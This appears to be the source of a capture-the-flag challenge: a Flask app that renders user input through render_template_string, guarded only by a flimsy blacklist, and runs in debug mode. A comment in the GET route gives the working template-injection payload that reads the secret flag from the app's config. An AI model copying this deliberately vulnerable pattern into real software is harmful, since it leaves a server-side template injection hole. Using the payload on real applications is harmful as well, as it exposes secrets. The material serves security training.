import flask
import os

app = flask.Flask(__name__)

app.config['flag'] = os.environ.pop('flag')


@app.route('/src')
def index():
    return open(__file__).read()


@app.route('/', methods = ['POST'])
def shrine():
    shrine = flask.request.values.get("username")

    def safe_jinja(s):
        s = s.replace('(', '').replace(')', '')
        blacklist = ['config', 'self']
        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s

    return flask.render_template_string(safe_jinja(shrine))

@app.route('/', methods = ['GET'])
def result():
    return  """
    # 此处填{{url_for.__globals__['current_app'].config.flag}}直接出解
    # 写了那么多年flask 总算没有白写 泪目
    	    """

@app.route('/robots.txt')
def res():
    return 'src/'

if __name__ == '__main__':
    app.run(debug=True)